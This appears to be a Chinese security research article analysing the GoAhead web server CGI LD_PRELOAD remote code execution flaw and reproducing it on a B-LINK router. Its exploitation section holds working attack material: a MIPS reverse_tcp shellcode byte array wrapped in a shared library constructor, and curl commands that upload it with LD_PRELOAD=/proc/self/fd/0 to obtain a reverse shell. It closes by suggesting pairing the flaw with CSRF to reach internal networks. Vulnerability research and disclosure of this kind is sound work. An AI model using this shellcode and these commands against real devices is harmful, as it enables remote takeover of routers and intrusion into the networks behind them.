作者：[Yaseng&ioxera@伏宸安全实验室](http://mp.weixin.qq.com/s/fDR1tVvMJwXTeOWphUQl1Q
"Yaseng&ioxera@伏宸安全实验室")

#### 前言

GoAhead Web Server
广泛应用于嵌入式设备中，最近其出现了一个高危漏洞，在开启CGI的情况下，可以远程代码执行，据此本文简要分析了该漏洞详情，并在某款路由器上成功复现，反弹shell。

#### 漏洞分析

这个漏洞出现在goahead/src/cgi.c:cgihandler函数中，它使用http请求参数中的键值对来初始化新进程的envp参数，在此处只对“REMOTE_HOST”和“HTTP_AUTHORIZATION”参数进行了判断，其他参数全部默认信任。

![](https://images.seebug.org/content/images/2017/12/aa44818a-6c10-4669-8163-04aa80e1e1bb.jpg-w331s)

随后，该函数又将子进程标准输入输出指定到了一个临时文件，而这个临时文件是由post请求的数据部分初始化的，最后launchCgi函数使用从http请求中得到的参数和标准输入输出创建了cgi脚本进程。

![](https://images.seebug.org/content/images/2017/12/5a13fb35-e0b8-4f7f-84d2-5c76973eb277.jpg-w331s)

查看goahead的elf header可以得到其interp段依赖链接器“/lib64/ld-linux-x86-64.so.2”，动态链接器是在链接过程中最先运行的代码，它用来加载目标程序的共享库和符号表。

![](https://images.seebug.org/content/images/2017/12/ec66864b-c0d9-4c65-a620-ee63b51bd7e8.jpg-w331s)

在链接器链接过程中会根据环境变量的值进行不同的操作，其中LD_PRELOAD变量可以指定一个共享库列表，链接器会优先加载此列表中共享库。

如果我们在http请求中指定LD_PRELOAD环境变量，此变量将被当作启动cgi脚本的参数传递给链接器，从而可以在cgi脚本启动之前执行任意.so文件，由于post请求中的数据被保存到/tmp文件夹中的一个临时文件中，而launchCgi函数又将cgi脚本的标准输入输出指定到了该临时文件，因此我们可以远程向目标写入一个.so文件，并将LD_PRELOAD指定为“/proc/self/fd/0”来间接引用post请求数据创建的临时文件，从而在目标系统上执行任意代码。

#### 实战

##### 调试设备

为了验证该漏洞的真实危害性，找了B-LINK的一款路由器来做测试，首先通过路由器上的UART串口，进入路由器的调试窗口。

![](https://images.seebug.org/content/images/2017/12/b204bf5d-56c7-4abc-abdc-2e1602aee568.jpg-w331s)

查看web server 是否 goahead 并且有cgi程序。

![](https://images.seebug.org/content/images/2017/12/60d0393b-470f-4d52-837b-a834799663cc.jpg-w331s)

##### 漏洞验证

有四个cgi文件，找到一个能使用的upload_settings.cgi(需要登陆）

![](https://images.seebug.org/content/images/2017/12/afd260aa-4c14-453d-8add-389e8e777648.jpg-w331s)

此路由器的系统为 mipsel，原作者没有给出mips小端格式的测试so，使用mipsel交叉编译Buildroot编译一个

    
    
    pentest@ubuntu:~/buildroot$ cat   mipsel-hw.c
    #include <unistd.h>
    static void before_main(void) __attribute__((constructor));
    static void before_main(void)
    {
        write(1, "Hello: World!\n", 14);
    }
    pentest@ubuntu:~/buildroot$ ./mipsel-linux-gcc -shared -fPIC  mipsel-hw.c -o mipsel-hw.so
    pentest@ubuntu:~/buildroot$ file mipsel-hw.so
    mipsel-hw.so: ELF 32-bit LSB shared object, MIPS, MIPS32 version 1 (SYSV), dynamically linked, not stripped

测试

    
    
    curl -X POST   -b  "user=admin;platform=0"  --data-binary @payloads/mipsel-hw.so   http://192.168.16.1/cgi-bin/upload_settings.cgi?LD_PRELOAD=/proc/self/fd/0 -i

![](https://images.seebug.org/content/images/2017/12/85575786-24e8-4727-b755-2d1d2393b9ad.jpg-w331s)

回显成功，说明漏洞存在。

##### 生成 payload

使用routesplite 生成一个mipsel 下的reverse_tcp shellcode 。

![](https://images.seebug.org/content/images/2017/12/4830c208-be39-4525-b3d3-ed068ca7bbd9.jpg-w331s)

写入动态链接库中

    
    
    #include <stdio.h>
    #include <unistd.h>
    unsigned char sc[] = {
        "\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04"
        "\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20"
        "\x80\x01\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27"
        "\x20\x80\x01\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24"
        "\x0c\x09\x09\x01\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09"
        "\x01\xc9\x0f\x02\x24\x0c\x09\x09\x01\x15\xb3\x05\x3c\x02\x00"
        "\xa5\x34\xf8\xff\xa5\xaf\x10\x67\x05\x3c\xc0\xa8\xa5\x34\xfc"
        "\xff\xa5\xaf\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01"
        "\x4a\x10\x02\x24\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08"
        "\x35\xec\xff\xa8\xaf\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff"
        "\xa8\xaf\xff\xff\x07\x28\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec"
        "\xff\xa4\x23\xec\xff\xa8\x23\xf8\xff\xa8\xaf\xf8\xff\xa5\x23"
        "\xec\xff\xbd\x27\xff\xff\x06\x28\xab\x0f\x02\x24\x0c\x09\x09"
        "\x01"
    };
    static void before_main(void) __attribute__((constructor));
    static void before_main(void)
    {
        void(*s)(void);
        s = sc;
        s();
    }

Buildroot编译

    
    
    ./mipsel-linux-gcc -shared -fPIC mipsel-reverse-tcp.c -o mipsel-reverse-tcp.so

##### 反弹shell

本地 nc 监听 5555 端口，把生成的so文件post到目标

    
    
    curl -X POST   -b  "user=admin;platform=0"  --data-binary @payloads/mipsel-reverse-tcp.so   http://192.168.16.1/cgi-bin/upload_settings.cgi?LD_PRELOAD=/proc/self/fd/0

![](https://images.seebug.org/content/images/2017/12/731ffe62-850d-4c97-a752-68ac3d1c9f32.jpg-w331s)

成功反弹shell

![](https://images.seebug.org/content/images/2017/12/f604111a-eaa2-445a-a202-513de855da58.jpg-w331s)

#### 思考

  1. 在挖掘IOT设备应用层漏洞时，也需要去关注系统组件的安全。
  2. 如果goahead 的cgi 程序无需登录可以访问，可以直接配合csrf 打内网。

#### 参考

  1. Remote LD_PRELOAD Exploitation <https://www.elttam.com.au/blog/goahead>
  2. routesplite <https://github.com/reverse-shell/routersploit>
  3. 硬件调试 <http://future-sec.com/iot-security-hardware-debuging.html>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/488/>

